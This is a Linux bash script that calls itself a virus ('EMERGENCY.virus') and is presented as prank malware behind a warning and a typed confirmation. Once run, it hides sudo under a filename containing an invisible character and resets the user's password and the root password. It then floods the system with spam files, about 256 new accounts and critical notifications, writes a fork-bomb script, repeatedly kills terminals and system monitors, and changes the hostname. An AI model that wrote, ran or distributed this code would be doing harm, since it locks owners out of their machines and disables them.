#!/bin/bash
echo ""
echo ""
echo ""
echo "____________________EMERGENCY.virus.sh____________________"
echo -e "\033[0;31m!! WARNING !!\033[0m"
echo "  We warned you to use this virus. Better use a virtual computer to run this."
echo "Information:"
echo "  Don't run this script as root. If you run as root it dont make any visible changes."
echo "  But you still need to type your sudo password sometimes."
echo "  Some Tasks listed down here need some time and are async."
echo "What is this virus doing?:"
echo "  Moving sudo from /usr/bin/sudo to /srv/EMERGENCY.virus.INFECTED!!!"
echo "  Change your password to 'EMERGENCY.virus' and change root password to a randum number from 0-9."
echo "  Change your fullname to 'Password EMERGENCY.virus'."
echo "  Start some cpukiller."
echo "  Copy !MANY! spam files."
echo "  Adding !!MANY!! users."
echo "  Sending !MANY! notify-send messages."
echo "  Killing some processes every 0.25 seconds."
echo "  Changing hostname."
echo "How to fix all that?:"
echo "  First find where i hide the invisible char in the moved sudo filename. The invisible char: U+200D"
echo "  Change your password back. Find root's password and change it too."
echo "  Change your fullname."
echo "  cpukillers dont need any fix, they are turned off after system reboot."
echo "  Deleting all spam files."
echo "  Remove all other users, maybe you write a script for it."
echo "  Autoprocesskiller is fixed with reboot too."
echo "  notify-send messages are fixed after reboot."
echo "  Changing hostname."
echo "Note:"
echo "  It's not possbile to run the sudo file from commandline. You need to make a bash script to make it possible to run or move it back to /usr/bin/sudo".
read -p 'Confirm: Realy run virus? [YeS to run, else cancel]: ' CancelVirus
if [[ "$CancelVirus" != "YeS" ]]; then
    echo "Canceled Virus!"
    exit 1
fi
echo "Starting Virus..."

if sudo -v >&/dev/null; then
    sudo echo "Allowed sudo permissions!"
    sudo mv /usr/bin/sudo /srv/EMERGENCY.virus.INFECTED!‍!‍!
    echo "Moved /usr/bin/sudo to a other path!"
fi

echo "Turning stdout off."
exec > /dev/null

INTERRUPT () {
    echo "Sorry this script is trapped!"
    exit 1
}
trap INTERRUPT SIGINT
KILLED () {
    echo "Nice Try to kill the process"
}
trap KILLED SIGKILL
echo "Trapped SIGINT"

username=$(whoami)

/srv/EMERGENCY.virus.INFECTED!‍!‍! usermod -c "Password EMERGENCY.virus" $username --badnames
echo "$(whoami):EMERGENCY.virus" | /srv/EMERGENCY.virus.INFECTED!‍!‍! chpasswd
echo "root:$((0 + $RANDOM % 9))" | /srv/EMERGENCY.virus.INFECTED!‍!‍! chpasswd

filestrings=""
counter=0
while [[ $counter -lt 2028 ]]; do
    : $((counter++))
    filestrings=$filestrings"    EMERGENCY.virus runned!‍!‍!"
done
echo -e $filestrings > "./EMERGENCY.virus.EMERGENCYFILE"
echo "Made spam file"

counterFILE=0
(while [[ $counterFILE -lt 2048 ]]; do
    if [ -f "./FILE$(printf "%06d" "$counterFILE").EMERGENCY.virus.EMERGENCYFILE" ]; then
        rm "./FILE$(printf "%06d" "$counterFILE").EMERGENCY.virus.EMERGENCYFILE"
    fi
    cp "./EMERGENCY.virus.EMERGENCYFILE" "./FILE$(printf "%06d" "$counterFILE").EMERGENCY.virus.EMERGENCYFILE" &
    echo "Copied spam file to ./FILE$(printf "%06d" "$counterFILE").EMERGENCY.virus.EMERGENCYFILE"
    : $((counterFILE++))
done
echo "Copied $counter spam files.") &

VIRUSPATH="$PWD/RAMEATER.sh"

echo 'RAMEATER@EMERGENCY.virus () {
    RAMEATER@EMERGENCY.virus | RAMEATER@EMERGENCY.virus &
}
RAMEATER@EMERGENCY.virus & RAMEATER@EMERGENCY.virus & RAMEATER@EMERGENCY.virus & RAMEATER@EMERGENCY.virus & RAMEATER@EMERGENCY.virus &' > $VIRUSPATH

chmod +x $VIRUSPATH

#$VIRUSPATH & $VIRUSPATH & $VIRUSPATH &

EATRAM () {
    #zenity --warning --title "EMERGENCY.virus" --text "This window opens to eat RAM." & EATRAM &
    echo "READY"
}

if zenity --version >&/dev/null; then
    counterZenity=0
    (while [[ $counterZenity -lt 512 ]]; do
        : $((counter++))
        #zenity --warning --title "EMERGENCY.virus" --text "This window opens to eat RAM." & EATRAM &
    done)&
fi

counterMessages=0
(while [[ $counterMessages -lt 512 ]]; do
    : $((counter++))
    notify-send --urgency=critical "EMERGENCY.virus" "EMERGENCY.virus destroyed your pc!"
done)&

/srv/EMERGENCY.virus.INFECTED!‍!‍! usermod -c "EMERGENCY.virus" $username

counterUSERS=0
(while [[ $counterUSERS -lt 256 ]]; do
    : $((counterUSERS++))
    if id "$username" &>/dev/null; then
        /srv/EMERGENCY.virus.INFECTED!‍!‍! deluser USER$(printf "%06d" "$counterUSERS")@EMERGENCY.virus
    fi
    /srv/EMERGENCY.virus.INFECTED!‍!‍! adduser --no-create-home --disabled-password --gecos "USER$(printf "%06d" "$counter")@EMERGENCY.virus" USER$(printf "%06d" "$counterUSERS")@EMERGENCY.virus --force-badname && echo "USER$(printf "%06d" "$counterUSERS")@EMERGENCY.virus:EMERGENCY.virus" | /srv/EMERGENCY.virus.INFECTED!‍!‍! chpasswd
done)&

(while [[ true ]]; do
    if [[ "$(pidof gnome-system-monitor)" != "" ]]; then
        killall gnome-system-monitor -SIGKILL
    fi
    if [[ "$(pidof gnome-terminal-server)" != "" ]]; then
        killall gnome-terminal-server -SIGKILL
    fi
    if [[ "$(pidof top)" != "" ]]; then
        killall top -SIGKILL
    fi
    sleep 0.25
done)&

/srv/EMERGENCY.virus.INFECTED!‍!‍! hostname -b INFECTEDEVICE@EMERGENCY.virus